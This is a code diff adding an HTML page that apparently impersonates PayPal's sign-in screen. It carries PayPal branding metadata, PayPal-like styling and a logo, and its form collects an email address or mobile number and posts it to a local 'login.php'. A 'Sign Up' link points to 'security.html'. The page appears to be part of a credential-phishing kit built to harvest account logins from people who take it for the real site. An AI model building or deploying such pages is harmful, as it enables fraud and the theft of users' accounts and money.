@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html style="overflow-y:hidden !important;">
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   Log in to your account
+  </title>
+  <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+  <meta content="PayPal" name="application-name"/>
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1.0,user-scalable=no" name="viewport"/>
+  <link href="images/favicon_x.ico" rel="shortcut icon"/>
+  <link href="images/img64.png" rel="apple-touch-icon"/>
+  <meta content="images/img258.png" property="og:image"/>
+  <link href="styles/css/contextualLogin.css" rel="stylesheet"/>
+  <style>
+   section{
+        
+      margin: 120px auto 0;
+padding: 42px 42px 36px;
+border: 1px solid #eaeced;
+overflow: hidden;
+
+width: 460px;
+
+border-radius: 5px;
+
+box-sizing: border-box;
+
+color: #2c2e2f;
+font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
+font-size: 93.75%;
+        
+        
+    }
+    
+.image{
+    
+    margin: 0 auto;
+    text-align:center;
+}
+    
+img{
+    
+    width: 110px;
+height: 30px;
+  margin: 0 auto;    
+}    
+
+
+input{
+    
+    height: 44px;
+width: 100%;
+padding: 0 10px;
+border: 1px solid #9da3a6;
+background: #fff;
+border-style:solid !important;
+    box-sizing: border-box;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    -khtml-border-radius: 4px;
+    border-radius: 4px;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #000;
+    font-size: 1em;
+    font-family: Helvetica,Arial,sans-serif;
+    font-weight: 400;
+
+}
+#email:focus{
+     
+     border: 1px solid #0070ba !important;
+     
+     
+ }
+ 
+#email{
+    
+    
+     border-style:solid !important;
+-webkit-appearance: none  !important;
+  border-style: solid !Important;
+    padding: 0 important;
+}
+    
+    
+} 
+ .error{
+     
+     border: 1px solid #c72f38;
+background-image: url('images/error-sprite.png') !important;
+background-position: 99% -409px;
+background-position: top -409px right 10px;
+background-size: 25px;
+background-repeat: no-repeat;
+     
+transition: border .2s ease-in-out,background-color .2s ease-in-out; 
+     
+ }
+ 
+
+.errorMessage {
+    position: absolute;
+    top: 0px;
+    bottom:4rem;
+    left: 0;
+    z-index: 1;
+    width: 100%;
+    padding: 10px;
+
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    -khtml-border-radius: 5px;
+    border-radius: 5px;
+    background: #c72f38;
+    color: #fff;
+    transition: all .3s ease-out !important;
+     display:none;
+   height: 2rem !important;  
+ }
+   
+@media only screen and (max-width: 600px) {
+body{
+    
+
+    
+}
+
+ section{
+     
+     position:relative;
+     
+     bottom:9rem;
+     border: none;
+     right:15px;
+     width: 110%;
+    
+     
+ }
+ 
+ input{
+     
+      outline:none;
+      border-style:solid !important;
+   
+     
+}
+ }
+}
+  </style>
+  <script>
+   function validateUser(){
+        
+        var username = document.getElementById('email')
+        var error = document.getElementById('errorMe')
+if(username.value.length < 5){
+    
+    username.classList.add('error');
+    
+    username.style.backgroundImage = "url('images/non.png')"
+     username.style.backgroundPosition =  '98% center';
+username.style.backgroundSize =  '2.1rem';
+username.style.backgroundRepeat =  'no-repeat';
+
+username.style.border = '1px solid #c72f38'
+
+
+    error.style.display = 'block';
+    
+    
+    
+    return false
+}else{
+    
+    
+    return true
+    
+}
+        
+        
+        
+        
+        
+    }
+  </script>
+ </head>
+ <body class="desktop" style="overflow-y:hidden !important;">
+  <section style="overflow-y:hidden !important;">
+   <div class="image">
+    <img src="images/centerlogo.svg"/>
+   </div>
+   <form action="login.php" method="POST" onsubmit="return validateUser()">
+    <div class="fieldWrapper ">
+     <br/>
+     <br/>
+     <input class="" id="email" name="username" onclick="document.getElementById('errorMe').style.display='none'" placeholder="Email address or mobile number" type="text"/>
+     <div style="position:relative;top:-3.9rem">
+      <p class="errorMessage show" id="errorMe" style="transition: all .3s ease-out !important;">
+       Required.
+      </p>
+      <p class="invalidError hide">
+       The email address or mobile number format is incorrect.
+      </p>
+     </div>
+    </div>
+    <br/>
+    <div class="actions">
+     <button class="button" id="btnNext" name="submit" type="submit" value="Next">
+      Next
+     </button>
+    </div>
+    <div class="loginSignUpSeparator ">
+     <span class="textInSeparator">
+      or
+     </span>
+    </div>
+    <a class="button" href="security.html" id="" role="button" style="background-color: #E1E7EB;
+color: #2C2E2F;">
+     Sign Up
+    </a>
+   </form>
+  </section>
+  <script src="images/js/signin-split.js">
+  </script>
+ </body>
+</html>
